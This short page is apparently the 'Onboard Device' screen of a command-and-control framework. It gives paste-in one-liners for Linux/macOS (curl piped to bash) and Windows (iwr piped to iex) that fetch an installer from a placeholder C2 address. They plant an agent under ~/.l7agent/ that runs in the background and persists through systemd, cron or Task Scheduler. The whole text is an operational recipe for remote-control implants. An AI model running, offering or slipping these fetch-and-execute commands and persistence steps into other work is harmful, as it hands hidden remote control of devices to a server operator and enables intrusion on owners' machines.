Onboard Device

Enter your C2 server IP. One-liner installer commands are generated below — paste onto any device. The installer auto-detects the OS, installs Python if missing, downloads the agent with C2 address baked in, and sets it up to run persistently in the background.

Linux / macOS — paste in terminal 
curl -s "http://YOUR_C2_IP:5000/install.sh?host=YOUR_C2_IP&port=5000" | bash
Windows — paste in PowerShell 
iwr "http://YOUR_C2_IP:5000/install.ps1?host=YOUR_C2_IP&port=5000" | iex
The agent installs to ~/.l7agent/, starts immediately, and persists across reboots via systemd / cron / Task Scheduler.
